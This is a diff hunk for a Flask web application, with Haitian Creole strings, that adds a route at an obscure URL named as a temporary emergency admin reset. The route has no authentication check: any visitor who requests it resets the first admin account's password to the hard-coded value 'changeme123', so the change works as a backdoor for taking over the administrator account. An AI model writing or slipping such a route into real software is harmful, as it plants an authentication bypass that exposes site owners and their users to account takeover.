@@ -242,6 +242,16 @@ def change_password():
     return render_template("change_password.html")
 
 
+@app.route("/reset-admin-tanporè-x92k")
+def reset_admin_emergency():
+    admin = User.query.filter_by(role="admin").first()
+    if admin:
+        admin.set_password("changeme123")
+        db.session.commit()
+        return "Modpas admin reset a 'changeme123'. Ale konekte, epi chanje modpas la touswit apre."
+    return "Pa gen okenn kont admin nan baz done a."
+
+
 # ---------------------------------------------------------------------------
 # Inisyalizasyon baz done + premye kont admin
 # ---------------------------------------------------------------------------
